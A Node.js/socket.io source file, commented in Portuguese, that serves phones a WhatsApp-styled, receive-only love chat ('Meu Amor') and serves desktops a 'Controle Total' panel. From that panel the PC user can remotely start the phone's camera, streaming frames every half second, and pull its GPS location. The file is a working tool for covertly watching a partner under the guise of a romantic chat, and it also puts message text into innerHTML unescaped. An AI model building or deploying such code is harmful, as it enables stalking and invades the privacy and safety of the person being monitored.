const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" },
  transports: ['websocket', 'polling']
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const isMobile = /mobile|android|iphone|ipad/i.test(req.headers['user-agent'] || '');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    res.send(getMobilePage(fullUrl));
  } else {
    res.send(getPCPage(fullUrl));
  }
});

io.on('connection', (socket) => {
  console.log('✅ Cliente conectado:', socket.id);
  
  // PC envia mensagem para o celular
  socket.on('send_message', (data) => {
    console.log('📨 PC enviou:', data.text);
    socket.broadcast.emit('new_message', data);
  });
  
  // PC envia áudio para o celular
  socket.on('send_audio', (data) => {
    console.log('🎤 PC enviou áudio');
    socket.broadcast.emit('new_audio', data);
  });
  
  // Indicador de digitação do PC
  socket.on('typing_start', () => {
    socket.broadcast.emit('user_typing', { isTyping: true });
  });
  
  socket.on('typing_stop', () => {
    socket.broadcast.emit('user_typing', { isTyping: false });
  });
  
  // Comandos do PC para o celular
  socket.on('command', (cmd) => {
    console.log('🎮 Comando:', cmd.type);
    socket.broadcast.emit('execute_command', cmd);
  });
  
  // Streaming de câmera (do celular para o PC)
  socket.on('camera_frame', (frame) => {
    socket.broadcast.emit('camera_stream', frame);
  });
  
  // Localização (do celular para o PC)
  socket.on('location_update', (loc) => {
    console.log('📍 Localização recebida');
    socket.broadcast.emit('new_location', loc);
  });
  
  socket.on('disconnect', () => {
    console.log('❌ Desconectado:', socket.id);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🚀 Servidor rodando!`);
  console.log(`📍 http://localhost:${PORT}\n`);
  console.log(`📱 Celular: Apenas RECEBE mensagens`);
  console.log(`💻 PC: Controle TOTAL (envia mensagens, comandos, etc)`);
  console.log(`\n💡 Acesse do PC e do celular na mesma rede\n`);
});

// ==================== PÁGINA DO CELULAR (APENAS RECEBE) ====================
function getMobilePage(fullUrl) {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp - Visualização</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0b141a;
            height: 100vh;
            overflow: hidden;
        }
        .app {
            display: flex;
            flex-direction: column;
            height: 100vh;
            background: #0b141a;
        }
        .header {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #2a3942;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #25d366, #128c7e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            position: relative;
        }
        .online-badge {
            position: absolute;
            bottom: 0;
            right: 0;
            width: 12px;
            height: 12px;
            background: #25d366;
            border-radius: 50%;
            border: 2px solid #202c33;
        }
        .contact-info h3 {
            color: #e9edef;
            font-size: 16px;
        }
        .contact-status {
            color: #8696a0;
            font-size: 12px;
        }
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px 12px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 75%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.received {
            background: #202c33;
            color: #e9edef;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }
        .message-meta {
            display: flex;
            justify-content: flex-end;
            gap: 4px;
            margin-top: 4px;
            font-size: 10px;
            color: #8696a0;
        }
        .audio-message {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .audio-play {
            background: none;
            border: none;
            color: #e9edef;
            font-size: 20px;
            cursor: pointer;
        }
        .waveform {
            display: flex;
            gap: 3px;
            align-items: center;
            height: 30px;
        }
        .wave {
            width: 3px;
            background: #e9edef;
            border-radius: 2px;
            animation: wave 0.5s infinite alternate;
        }
        @keyframes wave {
            from { height: 5px; }
            to { height: 20px; }
        }
        .typing-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 12px;
            background: #202c33;
            border-radius: 16px;
            width: fit-content;
            margin-bottom: 8px;
        }
        .typing-dots {
            display: flex;
            gap: 4px;
        }
        .typing-dots span {
            width: 6px;
            height: 6px;
            background: #8696a0;
            border-radius: 50%;
            animation: typing 1.4s infinite;
        }
        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
            30% { transform: translateY(-6px); opacity: 1; }
        }
        .input-area {
            background: #202c33;
            padding: 12px 16px;
            border-top: 1px solid #2a3942;
        }
        .input-disabled {
            background: #1a242a;
            padding: 10px 16px;
            border-radius: 24px;
            color: #8696a0;
            font-size: 14px;
            text-align: center;
        }
        .toast {
            position: fixed;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: #1e2a32;
            color: #e9edef;
            padding: 8px 16px;
            border-radius: 24px;
            font-size: 13px;
            z-index: 1000;
            animation: slideUp 0.3s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }
        .camera-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #25d366;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            border: none;
            cursor: pointer;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            z-index: 10;
        }
        .menu-btn {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: #202c33;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            border: none;
            cursor: pointer;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            z-index: 10;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: #202c33;
            border-radius: 12px;
            padding: 20px;
            width: 90%;
            max-width: 300px;
            text-align: center;
        }
        .modal button {
            background: #25d366;
            border: none;
            padding: 12px;
            margin: 10px;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="app">
        <div class="header">
            <div class="header-left">
                <div class="avatar">💕<div class="online-badge"></div></div>
                <div class="contact-info">
                    <h3>Meu Amor</h3>
                    <div class="contact-status" id="statusText">🟢 online</div>
                </div>
            </div>
        </div>
        <div class="messages" id="messages"></div>
        <div class="input-area">
            <div class="input-disabled">
                📱 Modo visualização - Apenas recebendo mensagens
            </div>
        </div>
    </div>

    <!-- Botões de controle do celular -->
    <button class="camera-btn" id="cameraBtn">📷</button>
    <button class="menu-btn" id="menuBtn">⚙️</button>

    <!-- Modal de menu -->
    <div class="modal" id="modal">
        <div class="modal-content">
            <h3 style="color: #e9edef; margin-bottom: 20px;">Controles</h3>
            <button id="locationModalBtn">📍 Compartilhar Localização</button>
            <button id="vibrateModalBtn">📳 Testar Vibração</button>
            <button id="closeModalBtn" style="background: #c0392b;">Fechar</button>
        </div>
    </div>

    <script src="${fullUrl}/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        const messages = document.getElementById('messages');
        const statusText = document.getElementById('statusText');
        const modal = document.getElementById('modal');
        let cameraStream = null;
        
        function showToast(msg) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }
        
        function addMessage(text, isAudio = false, audioUrl = null) {
            const div = document.createElement('div');
            div.className = 'message received';
            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            
            if (isAudio && audioUrl) {
                const id = 'a_' + Date.now();
                div.innerHTML = \`
                    <div class="audio-message">
                        <button class="audio-play" onclick="this.innerHTML=this.innerHTML==='⏸️'?'▶️':'⏸️'; document.getElementById('\${id}')[this.innerHTML==='▶️'?'pause':'play']()">▶️</button>
                        <div class="waveform"><div class="wave"></div><div class="wave"></div><div class="wave"></div></div>
                        <audio id="\${id}" src="\${audioUrl}" style="display:none"></audio>
                    </div>
                    <div class="message-meta"><span>\${time}</span><span>✓✓</span></div>
                \`;
            } else {
                div.innerHTML = \`<div>\${text}</div><div class="message-meta"><span>\${time}</span><span>✓✓</span></div>\`;
            }
            messages.appendChild(div);
            messages.scrollTop = messages.scrollHeight;
        }
        
        // Receber mensagens do PC
        socket.on('new_message', (data) => {
            addMessage(data.text);
            showToast('💬 Nova mensagem do PC');
        });
        
        socket.on('new_audio', (data) => {
            addMessage('🎤 Mensagem de áudio', true, data.audio);
            showToast('🎤 Nova mensagem de áudio');
        });
        
        socket.on('user_typing', (data) => {
            statusText.innerHTML = data.isTyping ? '✍️ digitando...' : '🟢 online';
        });
        
        // Comandos recebidos do PC
        socket.on('execute_command', (cmd) => {
            if (cmd.type === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(200);
                showToast('📳 Vibração!');
            } else if (cmd.type === 'emergency') {
                if (navigator.vibrate) navigator.vibrate([500,200,500]);
                showToast('💖 Surpresa Especial! 💖');
                addMessage('💖 Surpresa especial recebida! 💖');
            } else if (cmd.type === 'get_location') {
                getLocation();
            } else if (cmd.type === 'start_camera') {
                startCamera();
            }
        });
        
        // Funções do celular
        function getLocation() {
            if (!navigator.geolocation) {
                showToast('❌ Geolocalização não suportada');
                return;
            }
            showToast('📍 Obtendo localização...');
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const loc = { 
                        lat: position.coords.latitude, 
                        lng: position.coords.longitude 
                    };
                    socket.emit('location_update', loc);
                    showToast('📍 Localização enviada para o PC!');
                },
                (error) => {
                    showToast('❌ Erro ao obter localização');
                }
            );
        }
        
        async function startCamera() {
            showToast('📷 Iniciando câmera...');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                cameraStream = stream;
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                
                setInterval(() => {
                    if (cameraStream && cameraStream.active) {
                        imageCapture.grabFrame()
                            .then(imageBitmap => {
                                const canvas = document.createElement('canvas');
                                canvas.width = imageBitmap.width;
                                canvas.height = imageBitmap.height;
                                canvas.getContext('2d').drawImage(imageBitmap, 0, 0);
                                socket.emit('camera_frame', canvas.toDataURL('image/jpeg', 0.5));
                            })
                            .catch(() => {});
                    }
                }, 500);
                
                showToast('📷 Câmera ativada!');
            } catch (err) {
                showToast('❌ Erro ao acessar câmera');
            }
        }
        
        // Botões do celular
        document.getElementById('cameraBtn').onclick = startCamera;
        document.getElementById('menuBtn').onclick = () => {
            modal.style.display = 'flex';
        };
        document.getElementById('locationModalBtn').onclick = () => {
            getLocation();
            modal.style.display = 'none';
        };
        document.getElementById('vibrateModalBtn').onclick = () => {
            if (navigator.vibrate) navigator.vibrate(200);
            showToast('📳 Vibração!');
            modal.style.display = 'none';
        };
        document.getElementById('closeModalBtn').onclick = () => {
            modal.style.display = 'none';
        };
        
        // Mensagem inicial
        messages.innerHTML = '<div class="message received">💕 Conectado! Aguardando mensagens do PC 💕<div class="message-meta"><span>Agora</span><span>✓✓</span></div></div>';
        
        socket.on('connect', () => {
            showToast('✨ Conectado ao PC! ✨');
        });
    </script>
</body>
</html>`;
}

// ==================== PÁGINA DO PC (CONTROLE TOTAL) ====================
function getPCPage(fullUrl) {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatsApp Web - Controle Total</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #111b21;
            height: 100vh;
            overflow: hidden;
        }
        .app { display: flex; height: 100vh; }
        .sidebar {
            width: 320px;
            background: #202c33;
            border-right: 1px solid #2a3942;
            display: flex;
            flex-direction: column;
        }
        .sidebar-header {
            padding: 20px 16px;
            border-bottom: 1px solid #2a3942;
        }
        .user-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .avatar {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, #25d366, #128c7e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        .main-chat {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: #0b141a;
        }
        .chat-header {
            background: #202c33;
            padding: 12px 16px;
            border-bottom: 1px solid #2a3942;
        }
        .contact-name {
            color: #e9edef;
            font-size: 16px;
            font-weight: 500;
        }
        .contact-status {
            color: #8696a0;
            font-size: 12px;
            margin-top: 4px;
        }
        .messages-area {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 65%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.sent {
            background: #005c4b;
            color: #e9edef;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }
        .message.received {
            background: #202c33;
            color: #e9edef;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }
        .message-meta {
            font-size: 10px;
            color: #8696a0;
            margin-top: 4px;
            text-align: right;
        }
        .input-area {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            gap: 12px;
            align-items: center;
        }
        .input-field {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px 16px;
            border-radius: 24px;
            color: #e9edef;
            font-size: 15px;
            outline: none;
        }
        .input-field::placeholder {
            color: #8696a0;
        }
        .send-btn, .mic-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8696a0;
            transition: all 0.2s;
        }
        .send-btn:hover, .mic-btn:hover {
            color: #25d366;
        }
        .control-panel {
            width: 340px;
            background: #202c33;
            border-left: 1px solid #2a3942;
            overflow-y: auto;
        }
        .panel-section {
            padding: 20px;
            border-bottom: 1px solid #2a3942;
        }
        .panel-title {
            color: #e9edef;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .btn-control {
            width: 100%;
            background: #2a3942;
            border: none;
            padding: 12px;
            border-radius: 8px;
            color: #e9edef;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: all 0.2s;
        }
        .btn-control:hover {
            background: #3b4a54;
            transform: translateY(-1px);
        }
        .btn-danger {
            background: #c0392b;
        }
        .btn-danger:hover {
            background: #e74c3c;
        }
        .btn-success {
            background: #005c4b;
        }
        .btn-success:hover {
            background: #006f5a;
        }
        .video-preview {
            background: #111b21;
            border-radius: 8px;
            margin-top: 12px;
            overflow: hidden;
        }
        .video-preview img {
            width: 100%;
            height: auto;
            display: block;
        }
        .location-info {
            background: #111b21;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            margin-top: 12px;
            word-break: break-all;
        }
        .location-info a {
            color: #25d366;
            text-decoration: none;
        }
        .status-badge {
            width: 8px;
            height: 8px;
            background: #25d366;
            border-radius: 50%;
            display: inline-block;
            margin-right: 6px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .recording {
            color: #e74c3c;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="app">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="sidebar-header">
                <div class="user-info">
                    <div class="avatar">💻</div>
                    <div>
                        <div style="color:#e9edef; font-weight:500;">PC - Controle Total</div>
                        <div style="color:#8696a0; font-size:12px;">Conectado</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Chat Principal -->
        <div class="main-chat">
            <div class="chat-header">
                <div>
                    <div class="contact-name">Meu Amor 💕</div>
                    <div class="contact-status" id="contactStatus">
                        <span class="status-badge"></span> online
                    </div>
                </div>
            </div>

            <div class="messages-area" id="messagesArea">
                <div class="message received">
                    💕 Conectado! Você pode enviar mensagens e controlar o celular 💕
                    <div class="message-meta">Agora</div>
                </div>
            </div>

            <div class="input-area">
                <button class="mic-btn" id="micBtn">🎤</button>
                <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem para o celular">
                <button class="send-btn" id="sendBtn">📤</button>
            </div>
        </div>

        <!-- Painel de Controle -->
        <div class="control-panel">
            <div class="panel-section">
                <div class="panel-title">
                    <span>📹</span> Controle de Câmera
                </div>
                <button class="btn-control btn-success" id="startCameraBtn">
                    <span>📷</span> Ativar Câmera do Celular
                </button>
                <div class="video-preview">
                    <img id="cameraPreview" src="" alt="Preview da câmera">
                </div>
            </div>

            <div class="panel-section">
                <div class="panel-title">
                    <span>📍</span> Localização
                </div>
                <button class="btn-control" id="getLocationBtn">
                    <span>📍</span> Solicitar Localização
                </button>
                <div class="location-info" id="locationInfo">
                    Aguardando localização...
                </div>
            </div>

            <div class="panel-section">
                <div class="panel-title">
                    <span>💖</span> Ações Especiais
                </div>
                <button class="btn-control" id="vibrateBtn">
                    <span>📳</span> Vibrar Celular
                </button>
                <button class="btn-control btn-danger" id="emergencyBtn">
                    <span>💥</span> Surpresa Especial
                </button>
            </div>

            <div class="panel-section">
                <div class="panel-title">
                    <span>ℹ️</span> Status da Conexão
                </div>
                <div style="background: #111b21; padding: 12px; border-radius: 8px;">
                    <div style="color: #8696a0; font-size: 12px;" id="connectionStatus">
                        🟢 Conectado ao servidor
                    </div>
                    <div style="color: #8696a0; font-size: 12px; margin-top: 5px;" id="deviceStatus">
                        📱 Aguardando celular...
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="${fullUrl}/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        
        // Elementos
        const messagesArea = document.getElementById('messagesArea');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const micBtn = document.getElementById('micBtn');
        const cameraPreview = document.getElementById('cameraPreview');
        const locationInfo = document.getElementById('locationInfo');
        const contactStatus = document.getElementById('contactStatus');
        const connectionStatus = document.getElementById('connectionStatus');
        const deviceStatus = document.getElementById('deviceStatus');

        // Estado
        let isRecording = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let typingTimeout = null;
        let isTyping = false;

        // ========== FUNÇÕES DO CHAT ==========
        function addMessage(text, type = 'sent') {
            const messageDiv = document.createElement('div');
            messageDiv.className = `message ${type}`;
            const now = new Date();
            const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            messageDiv.innerHTML = `
                ${text}
                <div class="message-meta">${timeStr}</div>
            `;
            messagesArea.appendChild(messageDiv);
            messagesArea.scrollTop = messagesArea.scrollHeight;
        }

        function sendMessage() {
            const text = messageInput.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('send_message', { text, timestamp: Date.now() });
                messageInput.value = '';
                stopTyping();
            }
        }

        function startTyping() {
            if (!isTyping) {
                isTyping = true;
                socket.emit('typing_start');
            }
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => stopTyping(), 1000);
        }

        function stopTyping() {
            if (isTyping) {
                isTyping = false;
                socket.emit('typing_stop');
            }
        }

        // ========== ÁUDIO ==========
        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                
                mediaRecorder.ondataavailable = (event) => audioChunks.push(event.data);
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        socket.emit('send_audio', { audio: reader.result, timestamp: Date.now() });
                        addMessage('🎤 Mensagem de áudio enviada', 'sent');
                    };
                    reader.readAsDataURL(audioBlob);
                    stream.getTracks().forEach(track => track.stop());
                    showToast('🎤 Áudio enviado para o celular!');
                };
                
                mediaRecorder.start();
                isRecording = true;
                micBtn.textContent = '⏹️';
                micBtn.classList.add('recording');
                showToast('🎤 Gravando... Clique novamente para parar');
            } catch (err) {
                console.error(err);
                showToast('❌ Erro ao acessar microfone');
            }
        }

        function stopRecording() {
            if (mediaRecorder && isRecording) {
                mediaRecorder.stop();
                isRecording = false;
                micBtn.textContent = '🎤';
                micBtn.classList.remove('recording');
            }
        }

        function showToast(message) {
            const toast = document.createElement('div');
            toast.style.cssText = `
                position: fixed;
                bottom: 20px;
                left: 50%;
                transform: translateX(-50%);
                background: #1e2a32;
                color: #e9edef;
                padding: 8px 16px;
                border-radius: 24px;
                font-size: 13px;
                z-index: 1000;
                animation: fadeInUp 0.3s ease;
            `;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }

        // ========== EVENTOS DO CHAT ==========
        sendBtn.addEventListener('click', sendMessage);
        messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
        messageInput.addEventListener('input', startTyping);
        
        micBtn.addEventListener('click', () => {
            if (isRecording) stopRecording();
            else startRecording();
        });

        // ========== CONTROLES DO CELULAR ==========
        document.getElementById('startCameraBtn').addEventListener('click', () => {
            socket.emit('command', { type: 'start_camera' });
            addMessage('📷 Solicitando ativação da câmera do celular...', 'sent');
            showToast('📷 Comando enviado para o celular');
        });

        document.getElementById('getLocationBtn').addEventListener('click', () => {
            socket.emit('command', { type: 'get_location' });
            addMessage('📍 Solicitando localização do celular...', 'sent');
            showToast('📍 Comando enviado para o celular');
        });

        document.getElementById('vibrateBtn').addEventListener('click', () => {
            socket.emit('command', { type: 'vibrate' });
            addMessage('📳 Vibração enviada para o celular', 'sent');
            showToast('📳 Vibração enviada!');
        });

        document.getElementById('emergencyBtn').addEventListener('click', () => {
            socket.emit('command', { type: 'emergency' });
            addMessage('💥 Surpresa especial enviada para o celular! 💥', 'sent');
            showToast('💥 Surpresa especial enviada!');
            
            // Efeito visual no botão
            const btn = document.getElementById('emergencyBtn');
            btn.style.transform = 'scale(0.95)';
            setTimeout(() => btn.style.transform = '', 200);
        });

        // ========== RECEBER DADOS DO CELULAR ==========
        socket.on('new_message', (data) => {
            addMessage(data.text, 'received');
            showToast('💬 Nova mensagem do celular');
        });

        socket.on('new_audio', (data) => {
            addMessage('🎤 Mensagem de áudio recebida do celular', 'received');
            showToast('🎤 Nova mensagem de áudio');
        });

        socket.on('camera_stream', (frameData) => {
            cameraPreview.src = frameData;
            deviceStatus.innerHTML = '📹 Recebendo vídeo da câmera';
        });

        socket.on('new_location', (location) => {
            locationInfo.innerHTML = `
                📍 Localização do celular:<br>
                Latitude: ${location.lat.toFixed(6)}<br>
                Longitude: ${location.lng.toFixed(6)}<br>
                <a href="https://www.google.com/maps?q=${location.lat},${location.lng}" target="_blank">
                    🗺️ Abrir no Google Maps
                </a>
            `;
            addMessage(`📍 Localização recebida: ${location.lat.toFixed(4)}, ${location.lng.toFixed(4)}`, 'received');
            showToast('📍 Localização recebida!');
        });

        socket.on('user_typing', (data) => {
            if (data.isTyping) {
                contactStatus.innerHTML = '<span style="color:#25d366;">✍️</span> digitando...';
            } else {
                contactStatus.innerHTML = '<span class="status-badge"></span> online';
            }
        });

        // ========== STATUS DA CONEXÃO ==========
        socket.on('connect', () => {
            connectionStatus.innerHTML = '🟢 Conectado ao servidor';
            addMessage('✨ Conectado ao celular! ✨', 'received');
            deviceStatus.innerHTML = '📱 Aguardando comandos do celular...';
        });

        socket.on('disconnect', () => {
            connectionStatus.innerHTML = '🔴 Desconectado do servidor';
            deviceStatus.innerHTML = '❌ Conexão perdida';
            contactStatus.innerHTML = '<span style="color:#8696a0;">●</span> offline';
        });

        // Animação CSS
        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeInUp {
                from {
                    opacity: 0;
                    transform: translateX(-50%) translateY(20px);
                }
                to {
                    opacity: 1;
                    transform: translateX(-50%) translateY(0);
                }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>`;
}
